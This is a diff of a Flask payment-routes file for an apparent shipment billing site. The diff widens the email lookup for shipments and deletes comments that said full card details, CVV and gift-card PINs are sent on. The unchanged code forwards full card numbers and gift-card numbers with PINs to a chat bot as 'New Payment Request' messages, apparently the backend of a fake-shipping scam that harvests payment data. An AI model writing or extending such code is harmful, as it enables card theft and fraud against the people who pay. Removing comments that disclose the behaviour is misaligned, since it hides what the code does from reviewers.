@@ -8,6 +8,7 @@ from io import BytesIO
 from datetime import datetime
 from flask import render_template, request, jsonify, flash
 from werkzeug.utils import secure_filename
+from sqlalchemy import or_
 from utils import (
     Shipment, db, get_bot, rset, rget, invalidate_cache,
     validate_email, estimate_distance, redis_client
@@ -24,7 +25,6 @@ def calculate_shipment_cost(distance_km: float, service_level: str) -> float:
 
 # ---------- SANITIZATION HELPERS (for logging only) ----------
 def _mask_string(s: str, show_last: int = 4) -> str:
-    """Mask a string, showing only the last `show_last` characters."""
     if not s or not isinstance(s, str):
         return ''
     if len(s) <= show_last:
@@ -33,7 +33,6 @@ def _mask_string(s: str, show_last: int = 4) -> str:
 
 
 def _sanitize_card(card: dict) -> dict:
-    """Return a safe copy of card details – no CVV, masked number."""
     if not card:
         return {}
     safe = {}
@@ -43,12 +42,10 @@ def _sanitize_card(card: dict) -> dict:
         safe['expiry'] = card['expiry']
     if card.get('number'):
         safe['number'] = _mask_string(card['number'], 4)
-    # CVV is intentionally omitted
     return safe
 
 
 def _sanitize_bank(bank: dict) -> dict:
-    """Return a safe copy of bank details – only last4 of account."""
     if not bank:
         return {}
     safe = {}
@@ -66,7 +63,6 @@ def _sanitize_bank(bank: dict) -> dict:
 
 
 def _sanitize_gift_card(gc: dict) -> dict:
-    """Return a safe copy – mask number, drop PIN."""
     if not gc:
         return {}
     safe = {}
@@ -74,12 +70,10 @@ def _sanitize_gift_card(gc: dict) -> dict:
         safe['name'] = gc['name']
     if gc.get('number'):
         safe['number'] = _mask_string(gc['number'], 4)
-    # PIN is intentionally omitted
     return safe
 
 
 def _sanitize_paypal(pp: dict) -> dict:
-    """PayPal details – email and note are safe."""
     if not pp:
         return {}
     safe = {}
@@ -91,7 +85,6 @@ def _sanitize_paypal(pp: dict) -> dict:
 
 
 def _sanitize_crypto(crypto: dict) -> dict:
-    """Crypto details – coin, amount, and hash are safe."""
     if not crypto:
         return {}
     safe = {}
@@ -116,7 +109,15 @@ def init_payment_routes(app):
         if not validate_email(email):
             flash('Invalid email address.', 'error')
             return render_template('billing_login.html')
-        shipments = Shipment.query.filter_by(recipient_email=email).order_by(Shipment.created_at.desc()).all()
+        
+        # Get shipments where email matches either recipient_email or receiver_email
+        shipments = Shipment.query.filter(
+            or_(
+                Shipment.recipient_email == email,
+                Shipment.receiver_email == email
+            )
+        ).order_by(Shipment.created_at.desc()).all()
+        
         invoices = []
         total_due = 0.0
         for s in shipments:
@@ -247,7 +248,6 @@ def init_payment_routes(app):
             if bot:
                 msg = f"💳 New Payment Request\nEmail: {email}\nMethod: {payment_method}\nTracking: {', '.join(tracking_numbers)}\n"
                 if request.is_json and payment_method == 'Credit Card':
-                    # Send full card details (including CVV) as submitted
                     card = card_details
                     msg += f"Card Number: {card.get('number', '')}\n"
                     msg += f"Expiry: {card.get('expiry')}\n"
@@ -272,7 +272,6 @@ def init_payment_routes(app):
                     msg += f"Sender Email: {pp.get('sender_email')}\n"
                     msg += f"Note: {pp.get('note')}"
                 elif not request.is_json and payment_method == 'Gift Card':
-                    # Send full card number and PIN
                     msg += f"Card Type: {data.get('gift_card_name')}\n"
                     msg += f"Card Number: {data.get('gift_card_number')}\n"
                     msg += f"PIN: {data.get('gift_card_pin', '')}"
@@ -305,7 +304,14 @@ def init_payment_routes(app):
 
         # Mark as pending (not paid) – admin will verify and mark paid
         for tn in tracking_numbers:
-            shipment = Shipment.query.filter_by(tracking_number=tn, recipient_email=email).first()
+            # Find shipment by tracking number AND email in either field
+            shipment = Shipment.query.filter(
+                Shipment.tracking_number == tn,
+                or_(
+                    Shipment.recipient_email == email,
+                    Shipment.receiver_email == email
+                )
+            ).first()
             if shipment and shipment.payment_status != 'paid':
                 shipment.payment_status = 'pending'
                 shipment.payment_method = payment_method
